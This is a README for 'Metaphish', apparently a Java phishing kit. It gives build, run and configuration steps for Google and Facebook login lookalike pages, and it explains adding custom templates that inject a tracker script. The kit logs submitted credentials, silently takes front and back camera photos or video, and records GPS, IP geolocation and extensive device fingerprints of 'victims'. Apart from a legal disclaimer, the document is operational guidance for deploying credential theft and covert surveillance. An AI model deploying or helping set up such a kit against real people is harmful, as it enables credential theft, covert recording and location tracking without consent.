# Metaphish

**Phishing Awareness & Red Team Profiling Tool**

A pure-Java, zero-dependency red team tool for security awareness exercises. Captures comprehensive device fingerprints, geolocation, camera images, and video from target browsers — all served from a single self-contained JAR.

> **Legal Disclaimer:** This tool is intended strictly for authorized penetration testing, security awareness training, and red team engagements. Unauthorized use against systems or individuals without explicit written permission is illegal. The author assumes no liability for misuse.

---

## Requirements

| Requirement | Version |
|---|---|
| Java Runtime | 17 or higher |
| Java Compiler (build only) | JDK 17+ |

No external dependencies or build tools (Maven/Gradle) required.

---

## Quick Start

### 1. Build from Source

```bash
bash build.sh
```

Output: `target/metaphish.jar`

### 2. Run

```bash
java -jar target/metaphish.jar
```

The server starts on `http://0.0.0.0:8080` with the Google template by default.

### 3. Access Admin Dashboard

```
http://localhost:8080/admin
```

Default credentials: `admin` / `metaphish`

---

## Configuration

Metaphish reads settings from a `.properties` file. By default it looks for `metaphish.properties` in the current working directory.

### Full Config Reference

```properties
#  Server 
server.host=0.0.0.0
server.port=8080

#  HTTPS / SSL 
server.ssl.enabled=false
server.ssl.keystore.path=data/ssl/metaphish.p12
server.ssl.keystore.password=metaphish

#  Template 
# Available: google, facebook
template.default=google

#  Admin Panel 
admin.username=admin
admin.password=metaphish

#  Storage 
capture.file=data/Captures.jsonl
form.capture.file=data/FormCaptures.jsonl
images.dir=data/images
report.dir=reports

#  Logging 
log.file=logs/metaphish.log
log.level=INFO

#  Geolocation API 
api.geolocation.timeout=10

#  Timing 
# Delay (seconds) before showing the phishing page after capture
reveal.delay.seconds=0

#  Camera / Video 
# camera.mode options: front | back | both | video
camera.mode=front

# video.source options: front | back | both  (only used when camera.mode=video)
video.source=front

# Duration of video capture in seconds (only used when camera.mode=video)
video.duration=10
```

### Using a Custom Config File

```bash
java -jar target/metaphish.jar --config /path/to/custom.properties
```

---

## CLI Options

All config file values can be overridden at runtime via CLI flags. CLI flags take precedence over the config file.

```
Usage: java -jar metaphish.jar [OPTIONS]

Options:
  -c, --config <file>          Config file path (default: metaphish.properties)
  -s, --host <host>            Bind host (default: 0.0.0.0)
  -p, --port <port>            Bind port (default: 8080)
  -t, --template <name>        Phishing template: google | facebook
  -u, --username <name>        Admin username
  -P, --password <pass>        Admin password
      --ssl                    Enable HTTPS
      --log-level <level>      VERBOSE | DEBUG | INFO | WARN | ERROR
      --camera-mode <mode>     front | back | both | video
      --video-source <src>     front | back | both  (requires --camera-mode video)
      --video-duration <secs>  Video capture duration in seconds
      --export                 Export all captures to file and exit
      --show-captures          Print all captures to terminal and exit
      --clear-captures         Delete all capture data and exit
  -v, --verbose                Verbose output
  -h, --help                   Show help
```

### Examples

```bash
# Run on port 443 with HTTPS using the Facebook template
java -jar target/metaphish.jar --ssl --port 443 --template facebook

# Run with video capture (10s, front camera), custom admin password
java -jar target/metaphish.jar --camera-mode video --video-duration 10 --password s3cr3t

# Capture both front and back camera stills
java -jar target/metaphish.jar --camera-mode both

# Change log level to verbose for debugging
java -jar target/metaphish.jar --log-level VERBOSE

# Export all captured data to file
java -jar target/metaphish.jar --export

# View all captures in terminal
java -jar target/metaphish.jar --show-captures
```

---

## Camera Modes

| Mode | Behavior |
|---|---|
| `front` | Silently captures a single photo from the front-facing camera |
| `back` | Silently captures a single photo from the rear camera |
| `both` | Captures photos from both front and rear cameras |
| `video` | Records a video clip (duration set by `video.duration`) |

Camera capture requires browser permission. If the user denies it, the capture is marked as `Permission Denied` in the log.

---

## HTTPS Setup

### Generate a Self-Signed Certificate

```bash
keytool -genkeypair \
  -alias metaphish \
  -keyalg RSA \
  -keysize 2048 \
  -storetype PKCS12 \
  -keystore data/ssl/metaphish.p12 \
  -validity 365 \
  -storepass metaphish
```

### Enable SSL in Config

```properties
server.ssl.enabled=true
server.ssl.keystore.path=data/ssl/metaphish.p12
server.ssl.keystore.password=metaphish
```

Or via CLI:

```bash
java -jar target/metaphish.jar --ssl --port 443
```

> HTTPS is required for the Geolocation API and camera access on most modern browsers.

---

## Available Templates

| Template | Path | Description |
|---|---|---|
| `google` | `/templates/Google/` | Google Sign-In lookalike |
| `facebook` | `/templates/Facebook/` | Facebook Login lookalike |

### Adding a Custom Template

1. Create a folder under `src/main/resources/templates/YourTemplate/`
2. Add `Index.html` as the landing page
3. Inject the tracker by including this script tag anywhere in the page:
   ```html
   <script src="/static/Tracker.js"></script>
   ```
4. Rebuild: `bash build.sh`
5. Launch: `java -jar target/metaphish.jar --template YourTemplate`

---

## What Gets Captured

Each victim visit generates a capture record with the following data points:

### Device & Browser
`OsName` · `OsVersion` · `DeviceType` · `DeviceBrand` · `DeviceModel` · `BrowserName` · `BrowserVersion` · `Platform` · `Language` · `LanguagesSupported` · `VendorName` · `DoNotTrack` · `CookieEnabled` · `PdfViewerEnabled` · `PluginCount` · `HistoryLength` · `DocumentReadyState`

### Display
`ScreenResolution` · `ScreenAvailable` · `ViewportSize` · `ColorDepth` · `PixelRatio` · `OrientationType` · `OrientationAngle`

### Hardware
`DeviceMemoryGb` · `HardwareConcurrency` · `MaxTouchPoints` · `VideoInputCount` · `AudioInputCount` · `AudioOutputCount` · `AudioContextSampleRate` · `AudioContextChannelCount`

### Network & IP Geolocation
`IpAddress` · `Country` · `Region` · `City` · `ISP` · `Organization` · `AsNumber` · `IsMobile` · `IsProxy` · `IsHosting` · `IpTimezone` · `ConnectionType` · `EffectiveConnectionType` · `DownlinkMbps` · `NetworkRtt` · `SaveData` · `OnlineStatus`

### GPS Location
`GpsLatitude` · `GpsLongitude` · `GpsAccuracy` · `GpsAltitude` · `GpsAltitudeAccuracy` · `GpsHeading` · `GpsSpeed`

### Battery
`BatteryLevel` · `BatteryCharging` · `BatteryChargingTime` · `BatteryDischargingTime`

### Browser Feature Detection
`ServiceWorkerSupported` · `IndexedDbSupported` · `WebAssemblySupported` · `WebRtcSupported` · `GamepadApiSupported` · `PaymentRequestSupported` · `BluetoothAvailable` · `UsbAvailable` · `SpeechSynthesisAvailable` · `SpeechRecognitionAvailable` · `NotificationPermission`

### Fingerprinting
`CanvasFingerprint` · `WebGlSupported` · `WebGl2Supported` · `WebGlRenderer` · `WebGlVendor` · `StorageQuotaMb` · `StorageUsedMb`

### Camera
`CameraFrontFile` · `CameraBackFile` · `CameraVideoFile` · `CameraVideoBackFile`

---

## Data & Reports

### Capture Files

| File | Contents |
|---|---|
| `data/Captures.jsonl` | Device/fingerprint captures (one JSON object per line) |
| `data/FormCaptures.jsonl` | Submitted credentials (one JSON object per line) |
| `data/images/` | Captured camera images and video files |

### Generate HTML Report

```bash
java -jar target/metaphish.jar --export
```

Generates a timestamped HTML report in the `reports/` directory containing credential table, camera image gallery, device capture table with GPS links, and summary stats.

### View Captures in Terminal

```bash
java -jar target/metaphish.jar --show-captures
```

Prints all captures with ANSI color-coded sections directly in the terminal.

### Clear All Data

```bash
java -jar target/metaphish.jar --clear-captures
```

---

<p align="center">
    &copy;
    Copyright 2023-2026 
    <a href="https://github.com/MatrixTM26">@MatrixTM26</a>
    &nbsp;
    &middot;
    &nbsp;
    All right reserved.
    <br>
    Licensed under
    &nbsp;
    <a href="./LICENSE">AGPL-V3</a>
</p>
